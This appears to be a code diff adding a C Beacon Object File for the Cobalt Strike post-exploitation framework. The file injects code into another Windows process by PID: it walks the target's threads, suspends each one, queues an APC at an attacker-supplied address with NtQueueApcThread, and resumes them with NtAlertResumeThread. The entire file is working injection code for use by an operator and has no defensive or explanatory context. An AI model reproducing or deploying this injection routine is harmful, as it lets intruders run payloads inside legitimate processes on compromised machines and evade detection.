@@ -1,0 +1,149 @@
+#include <windows.h>
+#include <tlhelp32.h>
+#include "beacon.h"
+
+
+typedef VOID(*PPS_APC_ROUTINE) (
+        __in_opt PVOID ApcArgument1,
+        __in_opt PVOID ApcArgument2,
+        __in_opt PVOID ApcArgument3
+        );
+
+#ifdef _Return_type_success_
+    typedef _Return_type_success_(return >= 0) LONG NTSTATUS;
+#else
+    typedef LONG NTSTATUS;
+#endif
+
+#ifndef NT_SUCCESS
+#define NT_SUCCESS(Status)   ((NTSTATUS)(Status) >= 0)
+#endif
+
+#ifndef STATUS_SUCCESS
+#define STATUS_SUCCESS       ((NTSTATUS)0x00000000L)
+#endif
+
+#ifndef STATUS_UNSUCCESSFUL
+#define STATUS_UNSUCCESSFUL  ((NTSTATUS)0xC0000001L)
+#endif
+
+#define STIF_SUPPORT_HEX    0x00000001L
+
+DECLSPEC_IMPORT WINBASEAPI HANDLE WINAPI KERNEL32$OpenProcess (DWORD, BOOL, DWORD);
+DECLSPEC_IMPORT WINBASEAPI HANDLE WINAPI KERNEL32$CreateToolhelp32Snapshot (DWORD, DWORD);
+DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$Thread32First (HANDLE, LPVOID);
+DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$Thread32Next (HANDLE, LPVOID);
+DECLSPEC_IMPORT WINBASEAPI HANDLE WINAPI KERNEL32$OpenThread (DWORD, BOOL, DWORD);
+DECLSPEC_IMPORT NTSYSAPI NTSTATUS NTAPI NTDLL$NtSuspendThread (HANDLE, LPVOID);
+DECLSPEC_IMPORT NTSYSAPI NTSTATUS NTAPI NTDLL$NtQueueApcThread (HANDLE, PPS_APC_ROUTINE, LPVOID, LPVOID, ULONG);
+DECLSPEC_IMPORT NTSYSAPI NTSTATUS NTAPI NTDLL$NtAlertResumeThread (HANDLE, LPVOID);
+
+DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$CloseHandle (HANDLE);
+DECLSPEC_IMPORT WINBASEAPI HANDLE WINAPI KERNEL32$CreateMutexA (LPSECURITY_ATTRIBUTES, BOOL, LPCSTR);
+DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$ReleaseMutex (HANDLE);
+DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI SHLWAPI$StrToInt64ExA (PCSTR, DWORD, PLONGLONG);
+
+
+int injectThread(int pid, long long remote_address)
+{
+    THREADENTRY32 te32;
+    te32.dwSize = sizeof(te32);
+    DWORD tid = 0;
+    NTSTATUS NtStatus;
+    HANDLE pRemoteHandle;
+    HANDLE hSnapshot;
+    HANDLE hThread;
+    HANDLE ghMutex;
+    DWORD dwCount=0, dwWaitResult; 
+
+    pRemoteHandle = KERNEL32$OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, pid);
+    if (pRemoteHandle == NULL)
+    {
+            BeaconPrintf(CALLBACK_OUTPUT, "OpenProcess failed");
+            goto end_close;
+    }
+
+    hSnapshot = KERNEL32$CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
+    if (hSnapshot == INVALID_HANDLE_VALUE)
+    {
+            BeaconPrintf(CALLBACK_OUTPUT, "CreateSnapshot failed");
+            goto end_close;
+    }
+    KERNEL32$Thread32First(hSnapshot, &te32);
+    while (KERNEL32$Thread32Next(hSnapshot, &te32))
+    {
+        if (te32.th32OwnerProcessID == pid)
+        {
+            hThread = KERNEL32$OpenThread(THREAD_ALL_ACCESS, FALSE, te32.th32ThreadID);
+            tid = te32.th32ThreadID;
+            if (!hThread)
+            {
+                    //wprintf(L"[-] Couldn't open thread:  0x%Ix, trying next one...\r\n", (SIZE_T)hThread);
+                    continue;
+            }
+            //printf(L"[+] Thread handle: 0x%Ix\r\n", (SIZE_T)hThread);
+            NtStatus = NTDLL$NtSuspendThread(hThread, NULL);
+            if (!NT_SUCCESS(NtStatus))
+            {
+                    BeaconPrintf(CALLBACK_OUTPUT, "Failed to suspend thread");
+                    goto thread_end;
+                
+            }
+
+            NtStatus = NTDLL$NtQueueApcThread(hThread, (PPS_APC_ROUTINE)remote_address, NULL, 0, 0);
+            //NtStatus = NtQueueApcThread(hThread, (PPS_APC_ROUTINE)GetProcAddress(GetModuleHandle(L"kernel32"), "LoadLibraryW"),&dllpath, 0, NULL);
+            if (!NT_SUCCESS(NtStatus))
+            {
+                    BeaconPrintf(CALLBACK_OUTPUT, "Failed NtQueueApcThread");
+                    goto thread_end;
+                    
+            }
+            NtStatus = NTDLL$NtAlertResumeThread(hThread, NULL);
+            if (!NT_SUCCESS(NtStatus))
+            {
+                    BeaconPrintf(CALLBACK_OUTPUT, "Failed NtAlertResumeThread");
+                     goto thread_end;
+                    
+            }
+            thread_end:
+                if(!KERNEL32$CloseHandle(hThread)) {
+                    BeaconPrintf(CALLBACK_OUTPUT, "Failed to CloseHandle(hThread)");
+                }
+        }
+    }
+
+    end_close:
+        if(!KERNEL32$CloseHandle(hSnapshot)) {
+            BeaconPrintf(CALLBACK_OUTPUT, "Failed to CloseHandle(hSnapshot)");
+        }
+        if(!KERNEL32$CloseHandle(pRemoteHandle)) {
+            BeaconPrintf(CALLBACK_OUTPUT, "Failed to CloseHandle(pRemoteHandle)");
+        }
+    return 0;
+}
+int go(char * args, int length)
+{
+    
+    datap parser;
+    int procId;
+    unsigned char* hex_buf;
+    long long buf_address;
+    int res = 0;
+
+    BeaconDataParse(&parser, args, length);
+    procId = BeaconDataInt(&parser);
+    hex_buf = BeaconDataExtract(&parser, NULL);
+
+    if(!SHLWAPI$StrToInt64ExA(hex_buf, STIF_SUPPORT_HEX, &buf_address)) {
+        BeaconPrintf(CALLBACK_OUTPUT, "Failed to convert hex string to long long with StrToInt64ExA");
+
+    }
+    BeaconPrintf(CALLBACK_OUTPUT, "Attempting to start threads at %s in process %d", hex_buf, procId);
+    res = injectThread(procId, buf_address);
+    if (res != 0)
+    {
+            BeaconPrintf(CALLBACK_OUTPUT, "Injection failed");
+    }
+
+    return 0;
+}
